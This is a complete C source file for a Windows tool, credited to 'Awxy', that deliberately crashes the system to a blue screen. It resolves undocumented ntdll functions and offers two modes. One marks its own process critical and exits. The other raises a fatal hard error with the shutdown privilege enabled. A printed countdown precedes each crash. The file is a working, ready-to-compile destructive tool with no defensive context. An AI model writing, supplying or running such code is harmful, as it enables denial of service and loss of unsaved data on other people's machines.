// Driverless BSOD With Native Api Functions
// Written By Awxy

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>

typedef LONG(__stdcall* _RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
_RtlAdjustPrivilege RtlAdjustPrivilege = NULL;

typedef LONG(__stdcall* _RtlSetIsProcessCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
_RtlSetIsProcessCritical RtlSetIsProcessCritical = NULL;

typedef LONG(__stdcall* _NtRaiseHardError)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
_NtRaiseHardError NtRaiseHardError = NULL;

void count_down()
{
	puts("[+] BlueScreen In 3");
	Sleep(1000);
	puts("[+] BlueScreen In 2");
	Sleep(1000);
	puts("[+] BlueScreen In 1");
	Sleep(1000);
}

int main(int argc, char** argv)
{
	if (argc < 2) {
		puts("[!] Invalid Parameters");
		puts("[+] Usage: bsod.exe -m1/-m2");
		return -1;
	}

	const HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	if (!ntdll) {
		puts("[!] Failed To Get Ntdll!");
		return -1;
	}

	RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");

	if (RtlAdjustPrivilege == NULL) {
		puts("[!] Failed To Find RtlAdjustPrivilege");
		return -1;
	}

	RtlSetIsProcessCritical = (_RtlSetIsProcessCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");

	if (RtlSetIsProcessCritical == NULL) {
		puts("[!] Failed To Find RtlSetProcessIsCritical");
		return -1;
	}

	NtRaiseHardError = (_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");

	if (NtRaiseHardError == NULL) {
		puts("[!] Failed To Find NtRaiseHardError");
		return -1;
	}

	if (!_stricmp(argv[1], "-m1")) {
		BOOLEAN o = FALSE;
		RtlAdjustPrivilege(20UL, TRUE, FALSE, &o);
		RtlSetIsProcessCritical(TRUE, &o, FALSE);
		count_down();
		return 0;
	}

	if (!_stricmp(argv[1], "-m2")) {
		LONG b = 0;
		BOOLEAN o = FALSE;
		RtlAdjustPrivilege(19UL, TRUE, FALSE, &o);
		count_down();
		NtRaiseHardError(0xDEADDEAD, 0, 0, NULL, 6, &b);
		return 0;
	}

	puts("[!] Invalid Parameters");
	puts("[+] Usage: bsod.exe -m1/-m2");
	return 0;
}